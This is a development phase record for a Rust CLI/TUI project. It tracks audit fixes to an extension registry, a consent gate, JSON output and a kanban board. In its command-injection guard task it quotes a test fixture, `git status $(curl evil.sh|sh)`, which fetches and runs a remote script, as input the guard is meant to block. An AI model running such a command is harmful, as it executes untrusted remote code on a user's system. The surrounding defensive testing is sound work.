---
phase: 32
name: "Command-Surface Audit Closure"
status: Done
subsystem: "crates/tui crates/cli crates/domain crates/core"
requires: []
provides:
  - "TUI global `/` key focuses the command bar (l2-tui §4.5)"
  - "Durable extension registry store: `<state>/extensions/registry.json`"
  - "Install-time scan gate on `ext add`; explicit grant on `ext activate`"
  - "`ToolGuard` command-substitution and line-break parity with `SkillScanner`"
  - "One full JSON escaper for every CLI `--format json` site"
  - "`board list --archived` read surface and a real Archive column"
  - "Row-granular degradation of the Board panel (`BoardView.unmapped`)"
key_files:
  created: []
  modified:
    - crates/tui/src/app.rs
    - crates/tui/src/pane_actions.rs
    - crates/tui/src/view.rs
    - crates/cli/src/commands.rs
    - crates/cli/src/installation.rs
    - crates/cli/src/generated.rs
    - crates/cli/src/main.rs
    - crates/cli/tests/cli_smoke.rs
    - crates/domain/src/extensions/mod.rs
    - crates/domain/src/kanban/mod.rs
    - crates/domain/src/tool_security.rs
    - crates/core/src/invocable_bootstrap/board.rs
    - crates/core/tests/kanban_board.rs
    - crates/core/tests/tool_security.rs
patterns_established:
  - "A guard exists to be reached: every keyboard-reachable surface is registered as a ClientLocal pane action through the shared door, never a bare key match"
  - "State that must survive a process boundary gets an atomic write-then-rename store; a corrupt store is an error, never an empty listing"
  - "One consent gate (`consent::gate`) serves every disclosure-then-confirm verb"
  - "Degrade at row granularity: set aside the one row a surface cannot place and name it, never blank the whole panel"
duration_minutes: ~
---

# Stage 32 Tasks — Command-Surface Audit Closure

**Phase:** 32
**Status:** Done
**Strategic Goal:** Realize `l2-tui` 1.3.0 §4.5 (the command bar's direct-entry key) and close five previously-disclosed-but-unbuilt gaps against already-Stable specs, all surfaced by a real build-and-run audit of the compiled CLI/TUI binary.

## Atomic Checklist

- [x] [T-32A01] Global `/` key focuses the command bar directly
- [x] [T-32B01] `ExtensionRegistry` gains a durable store
- [x] [T-32B02] `ext add` runs the install-time skill scanner
- [x] [T-32B03] `ext activate` requires an explicit grant
- [x] [T-32C01] `ToolGuard` shell-metacharacter parity with `SkillScanner`
- [x] [T-32D01] Remaining `--format json` sites honor the requested format
- [x] [T-32E01] Board panel's Archive column reads real data
- [x] [T-32E02] `board_column()` degrades one bad row, not the whole panel
- [x] [T-32T01] Full-cycle validation

## Detailed Tracking

### [T-32A01] Global `/` key focuses the command bar directly

- **Spec:** l2-tui.md §4.5
- **Status:** Done
- **Changes:** A global `/` key focuses the command bar from any other panel and is consumed by the move (never typed into the line it opened); once the bar holds focus `/` is ordinary text. Implemented the way the spec's own §4.4 requires rather than as a bare key match: a new `FocusCommandBar` pane action (`core:pane.focus-command`, `ClientLocal`) registered through the shared door alongside focus-next/prev/quit, applied by `dispatch_pane_action` only on a real `Dispatched::Ran` — so an unregistered action leaves focus where it was, proven by a test. The reported defect is pinned end to end: from the Board panel, typing `/test probe hello` then Enter runs the command.
- **Assignment:** Agent
- **Verify:** New unit tests in `crates/tui/src/app.rs`'s test module: (a) `Key::Char('/')` while `focus != CommandBar` sets `view.focus == Focus::CommandBar` and leaves `command_input` empty (the keystroke is consumed by the focus change, not inserted); (b) the same key while `focus == CommandBar` appends a literal `/` to `command_input` instead. `cargo test -p cronus-tui --all-targets` green.
- **Handoff:** None — independent of every other track.
- **Notes:** Add a global `/` arm in `App::handle_key` above the existing `_ if focus == CommandBar` arm, branching on current focus to decide jump-vs-insert. `Tab`/`BackTab`/`Esc` bindings stay exactly as they are.

### [T-32B01] `ExtensionRegistry` gains a durable store

- **Spec:** l2-extension-registry.md §4.2 (state-tier `extensions/` location layout), l2-tool-security.md §4.1
- **Status:** Done
- **Changes:** `ExtensionRegistry` persists to `<state>/extensions/registry.json` (`persist_path`/`load`/`save`, atomic write-then-rename, `CRONUS_PORTABLE_DIR`-aware); a missing store is empty, an unreadable/corrupt/duplicated/invalid store is a `Storage`/`InvalidManifest` error, never an empty listing; `ext add|activate|deactivate|list` load and save it; `ext list` shows each extension's state and is ordered by id. Correction to the plan's wording: `<ws>/extensions/plugins/<id>/config.json` holds UI config field values, not lifecycle state — the spec does not name a lifecycle-state file, so the index location follows the `<state>/extensions/` layout and the `AgentRegistry` precedent.
- **Assignment:** Agent
- **Verify:** A new `cli_smoke.rs` test spawning `cronus ext add <manifest>` and `cronus ext list` as two **separate** subprocess invocations (matching this suite's own subprocess-per-call convention) confirms the added extension is visible in the second call. `cargo test -p cronus-cli --all-targets` green.
- **Handoff:** Hard prerequisite for T-32B02 and T-32B03 — both are no-ops against a registry that forgets its own state between invocations, which is exactly this session's own empirical finding (a scan-flagged manifest "registered" cleanly, then vanished from `ext list` immediately after).
- **Notes:** The spec fixes the state-tier `extensions/` directory but no lifecycle-state file, so the index file and its format are a placement decision made in this task, following the agent registry's store. The store lives in `crates/domain` beside the registry type, as the agent registry does.

### [T-32B02] `ext add` runs the install-time skill scanner

- **Spec:** l2-tool-security.md §4.1, EXT-2
- **Status:** Done
- **Changes:** `ext add` scans the manifest text before registering; a CRITICAL or HIGH finding (`is_safe == false`, the spec's own "blocked" line) refuses with exit 1 and points at `ext scan <path>`, MEDIUM and below register and the scan summary is reported (text and JSON). The predicate is the spec's severity rule, not the `DoNotInstall` score band this task first named — every score above the band threshold already implies a HIGH/CRITICAL finding, but a single HIGH scores below it. No `--force`: the spec ties an override to an audit-trail entry no surface can write yet. `parse_manifest` moved from a substring scan to `serde_json` so a pretty-printed `extension.json` is a manifest at all.
- **Assignment:** Agent
- **Verify:** A `cli_smoke.rs` test reproducing this session's own empirical repro (a manifest whose content trips `SkillScanner`'s `DoNotInstall` recommendation) confirms `ext add` now exits non-zero and never registers it — checked by a following `ext list` not showing it. A second fixture with only `Safe`/`Caution` findings still registers normally.
- **Handoff:** Depends on T-32B01.
- **Notes:** Call `cronus_core::tool_security::SkillScanner::scan_content` before `registry.register(manifest)` in `crates/cli/src/commands.rs::ext::add`, mirroring the report shape `ext::scan` already prints.

### [T-32B03] `ext activate` requires an explicit grant

- **Spec:** l2-extension-registry.md, EXT-3
- **Status:** Done
- **Changes:** `ext activate` needs an explicit grant: interactively it discloses the manifest's declared filesystem/network/secrets permissions and asks for `yes`; non-interactively it refuses (exit 1, names `--yes`) and leaves the extension untouched; `--yes` is the scripted grant. An unknown id is reported as unknown before any question is asked. The gate (`Gate`/`gate`) moved out of `activation_cmd` into a shared `consent` module — both verbs now call the one mechanism and its four unit tests moved with it. The flag is `--yes`, not a longer acknowledgment name: this gate has one thing to confirm, unlike the unattended-execution grant.
- **Assignment:** Agent
- **Verify:** A `cli_smoke.rs` test mirroring the existing `activation_enable_without_acknowledgement_refuses_when_noninteractive` pattern: a non-interactive `ext activate` (stdin nulled) with no acknowledgment flag exits non-zero, naming the flag that would unblock it; supplying the flag (or a real interactive confirmation) lets activation proceed.
- **Handoff:** Depends on T-32B01.
- **Notes:** Reuse the `activation_cmd::enable_gate`/`confirm_disclosure` pattern already proven in the same crate rather than inventing a second consent mechanism.

### [T-32C01] `ToolGuard` shell-metacharacter parity with `SkillScanner`

- **Spec:** l2-tool-security.md §4.1
- **Status:** Done
- **Changes:** `ToolGuard` now flags command substitution (`$(`) and line breaks (`\n`, `\r`, a second-command separator) as `CommandInjection` at High, matching what `SkillScanner`'s CI-001 already called injection. Deliberately not the bare `$`, `(`, `)` characters the plan named: `Program Files (x86)` and `$5` are ordinary values, and a guard that flags every Windows path prompts constantly — a pinned test holds that decision. The plan's own example string (`... $(curl evil.sh|sh)`) also contains a `|` the guard already flagged, so it could not fail before this change; the discriminating fixtures are `git status $(whoami)` and a bare line break. Tests are in `crates/core/tests/tool_security.rs` (where the guard's tests live), not the domain file.
- **Assignment:** Agent
- **Verify:** New unit test in `crates/domain/src/tool_security.rs`: `ToolGuard::default().evaluate("bash", &[("cmd", "git status $(curl evil.sh|sh)")])` now reports a `CommandInjection` finding at `High` severity or above — the identical string `SkillScanner`'s CI-001 rule already flags. `cargo test -p cronus-domain --all-targets` green.
- **Handoff:** None.
- **Notes:** Extend `SHELL_METACHARACTERS` to include `$`, `(`, `)`, and newline.

### [T-32D01] Remaining `--format json` sites honor the requested format

- **Spec:** l2-cli.md §4.2
- **Status:** Done
- **Changes:** Audited each site from the code rather than from the plan's list, which was partly wrong: `registry create`/`disable`/`enable` and `ext activate` already honored the format — their "known residual" comments were stale, and are removed. The real format-discarding sites are fixed: `ext list` (JSON array of id/name/version/state), `ext scan` (JSON object), `registry show` (JSON object), and `activation enable`'s requires-approval branch (JSON outcome); its cancelled branch was a rejection printed on stdout and now goes to stderr like every other rejection. Found and fixed a genuinely unescaped interpolation the stale comments pointed away from — `registry list --format json` emitted the agent name raw. The two weak duplicate `json_escape` helpers (`main.rs`, `workspace`) — neither escaped control characters, so a newline in a value made invalid JSON — are replaced by the one full escaper in `output.rs`. New test proves `ext list`/`ext scan`/`ext add`/`registry show` emit parseable JSON, with an id containing a newline and quotes round-tripping.
- **Assignment:** Agent
- **Verify:** Extend `cli_smoke.rs`'s existing `installation_verbs_emit_valid_json_for_the_json_format` test's argument list to also cover `registry show work`, `registry create`, `registry disable`, `registry enable`, `ext list` (once T-32B01 makes a non-empty listing reachable), and the two flagged `activation`/`ext activate` outcome branches — each line must pass the same `looks_like_json` structural check the existing test already applies.
- **Handoff:** The `ext list` case benefits from T-32B01 landing first but does not block on it (an empty-registry JSON case is already covered).
- **Notes:** Sites are named in `crates/cli/src/commands.rs`'s own "Known residual" comments — fix each at its owning site rather than introducing a shared formatter.

### [T-32E01] Board panel's Archive column reads real data

- **Spec:** l2-tui.md §4.1, l2-kanban-board.md
- **Status:** Done
- **Changes:** Confirmed during execution that no read of archived cards existed (only the mutating `core:board.archive`, and a one-card `get_archived_card`), so the minimal read surface was defined inside the spec's already-stated archive store: `Board::list_archived_cards` (the live and archive reads now share one directory reader) and `board list --archived`, following the `role list --presets` precedent of a flag switching the listed set. An unreadable archive is `Unavailable`, not an empty list — the new flag branch does not repeat the live branch's known unavailable-as-empty residual. The Board panel now dispatches `core:board.list` twice and places archived cards in the Archive column whatever state they carry; an unreadable archive makes the whole board unavailable with an `archive:` reason rather than an empty column that reads as "nothing archived". `dispatch_projection` takes the call's arguments.
- **Assignment:** Agent
- **Verify:** New test in `crates/tui/src/app.rs` registering a fixture archived-cards read alongside `core:board.list` and asserting `dispatch_board`'s resulting `BoardView` includes the archived card under `BoardColumn::Archive`.
- **Handoff:** None.
- **Notes:** Only the mutating `core:board.archive` invocable was confirmed to exist this session — confirm during execution whether a read-side listing verb for already-archived cards exists yet; if not, define the minimal read surface consistent with l2-kanban-board.md's already-specified `<ws>/kanban/archive/` layout rather than inventing a new one.

### [T-32E02] `board_column()` degrades one bad row, not the whole panel

- **Spec:** l2-tui.md §4.1 ("unavailable ≠ empty, never silently drop a row" — applied here one level down, at row granularity)
- **Status:** Done
- **Changes:** A live card in a state the surface has no column for no longer fails the whole board: it is set aside by id in a new `BoardView.unmapped` list, the cards that can be placed still render, and the panel names the unplaced ones in a one-line note under the columns (a data-model change with the smallest possible display, so the drop is never silent; fuller visual treatment is left to the visual pass). A record of the wrong shape (missing id or state) is still an unrecognized result shape and still makes the panel unavailable — that is a contract break, not a card the surface cannot place.
- **Assignment:** Agent
- **Verify:** Unit test feeding `dispatch_board` a fixture `core:board.list` result with one card in an unrecognized state alongside one normal card: the normal card still renders and the panel stays `Projection::Available`, rather than the whole board falling to `Unavailable`.
- **Handoff:** None — composes with T-32E01 but does not require it.

### [T-32T01] Full-cycle validation

- **Goal:** Verify Phase 32 as a whole against `l2-tui` 1.3.0 and the five disclosed-gap specs it closes.
- **Method:** `cargo fmt --all -- --check`; `cargo clippy --workspace --all-targets -- -D warnings`; `cargo test --workspace` (PowerShell) green across 2 consecutive runs, no flake. Re-run this session's own empirical repro by hand against the freshly built binary (`ext scan` → `ext add` → `ext list` → `ext activate` over the same manifest that previously slipped through) and confirm the sequence now refuses at `ext add`. `rg` sweep for `unwrap\(\)|panic!\(|\.expect\(` across every phase-touched file, confirming no new production-path hits.
- **Status:** Done
- **Changes:** Validation evidence: `cargo fmt --all -- --check` exit 0; `cargo clippy --workspace --all-targets -j 2 -- -D warnings` clean; `cargo test --workspace --no-fail-fast -j 2` green on two consecutive full runs (87 result blocks each). Hand repro against the freshly built binary: a scan-unsafe manifest is refused at `ext add` (exit 1, "the scan found 3 finding(s) at risk 100 (HIGH)") and never listed; a warning-only manifest registers and is still listed by a separate later invocation; non-interactive `ext activate` refuses and names `--yes`; `--yes` activates and `ext list --format json` reports `"state":"active"`; `registry show work --format json` and `board list --archived` return the expected records. Production-path sweep for `unwrap()`/`panic!`/`.expect(` across every touched file found no new hits outside test modules.
- **Disclosed, not fixed (out of scope of this phase, recorded as diagnostics):** an intermittent pre-existing simulation test (`record_spend_accumulates_across_calls_rather_than_replacing`) that shares one fixed temp root across parallel tests — passes alone, flakes in a full parallel run, and a unique per-test root is the one-line remedy; one simulation scenario now stale because `ext add` refuses what it used to register; no scenario yet exercises the TUI command-bar key (the keystroke driver is deferred). Residuals left as they were: no integrity protection on the persisted extension store, no `--force` override (the spec ties one to an audit trail no surface can write yet), the live `board list` branch's older unavailable-as-empty read, and exec remaining `Unavailable` without an OS sandbox.
